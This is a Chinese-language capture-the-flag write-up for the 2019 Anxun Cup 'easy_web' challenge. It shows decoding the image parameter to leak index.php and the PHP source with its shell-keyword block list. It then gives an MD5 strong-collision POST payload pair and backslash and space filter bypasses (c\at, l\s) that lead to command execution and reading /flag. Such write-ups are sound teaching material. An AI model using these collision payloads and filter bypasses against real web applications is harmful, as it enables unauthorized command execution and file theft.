# [安洵杯 2019]easy_web md5强碰撞 preg_match绕过

比较简单



<img src="https://i-blog.csdnimg.cn/blog_migrate/46f9ee6e9bc1ea32dcab058170b8eae8.png" alt="" style="max-height:496px; box-sizing:content-box;" />


url一看就存在一个cmd 和base64

我们尝试给cmd传递参数 但是没有效果

所以我们就去看看 img里面是什么

直接放到瑞士军刀看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/9ff0e3498248e778dac66348bc05e1f0.png" alt="" style="max-height:514px; box-sizing:content-box;" />


知道了加密方法 我们去看看能不能返回 index.php代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/08916bb3d51b53b9c0c3d77f2a68d2be.png" alt="" style="max-height:578px; box-sizing:content-box;" />


```cobol
TmprMlpUWTBOalUzT0RKbE56QTJPRGN3
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/44e44c3cfb870e9966563a6a6a788186.png" alt="" style="max-height:185px; box-sizing:content-box;" />


返回了 接下俩就是代码审计了

```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));
 
$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixiï½ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}
 
?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
```

这里主要的是下面这段

```swift
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}
```

过滤cmd 如果a!=b 并且md5(a)=md5(b)

就执行cmd

这里主要是MD5强碰撞 网上一搜一大把

直接偷个payload

```cobol
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

url加密主要是防止识别不到

然后就是cmd的过滤了

## 这里过滤函数是preg_match

可以直接在过滤中加 \ 绕过

例如 c\at 就会识别为cat

空格我们可以使用 %20/来绕过

我们首先直接看看当前文件

l\s



<img src="https://i-blog.csdnimg.cn/blog_migrate/04aeaf25c3d544f9709bfe70efa9221c.png" alt="" style="max-height:512px; box-sizing:content-box;" />


然后看看根目录 dir%20/



<img src="https://i-blog.csdnimg.cn/blog_migrate/408632cec288f60c5a862f53b0c39e4f.png" alt="" style="max-height:144px; box-sizing:content-box;" />


直接读取flag即可

c\at%20/fl\ag



<img src="https://i-blog.csdnimg.cn/blog_migrate/678be8a2f04bbae02cefdd234cba9dc2.png" alt="" style="max-height:506px; box-sizing:content-box;" />